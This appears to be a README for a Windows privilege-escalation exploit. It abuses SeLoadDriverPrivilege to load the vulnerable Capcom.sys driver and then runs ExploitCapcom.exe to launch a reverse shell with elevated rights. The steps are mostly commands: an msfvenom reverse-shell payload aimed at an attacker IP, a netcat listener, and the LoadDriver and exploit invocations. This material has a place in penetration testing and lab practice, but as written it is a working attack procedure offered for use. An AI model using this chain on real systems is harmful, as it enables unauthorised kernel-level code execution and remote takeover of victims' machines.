# SeLoadDriverPrivilege Privilege Escalation

**Description**<br />
The `SeLoadDriverPrivilege` speifies the users who are allowed to dynamically load device drivers. The activation of this policy in the context of non-privileged users implies a significant risk due to the possibility of executing code in kernel space. 

**Step 1**<br />
Check if you have `SeLoadDriverPrivilege`.<br />
![alt text](https://i.imgur.com/sAmHWeY.png) 

**Step 2**<br />
Clone this repo.<br /><br />

**Step 3**<br />
Compile a reverse shell with `msfvenom` into a file called `rev.exe.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f exe -o rev.exe
```
<br />

**Step 4**<br />
Transfer `Capcom.sys`, `LoadDriver.exe`, `rev.exe` and `ExploitCapcom.exe` to victim machine.<br /><br />

**Step 5**<br />
Invoke `LoadDriver.exe`. This should return `NTSTATUS: 00000000, WinError: 0`. If it doesn't try changing the location of `Capcom.sys` or where you are executing `LoadDriver.exe`
```
.\LoadDriver.exe System\CurrentControlSet\MyService {C:\Users\Test\Capcom.sys}
```
![alt text](https://i.imgur.com/IYNL0u9.png) 

**Step 6**<br />
Start a `netcat` listener on port 4444
<br />

**Step 7**<br />
Put `rev.exe` in `C:\Windows\temp\rev.exe` and execute `ExploitCapcom.exe`. `C:\Windows\temp\rev.exe` is the default location the program will search for the reverse shell executable.
```
.\ExploitCapcom.exe
```

 You can also specify your own path to the reverse shell like so:
 ```
 .\ExploitCapcom.exe C:\Windows\Place\to\reverseshell\rev.exe
 ```
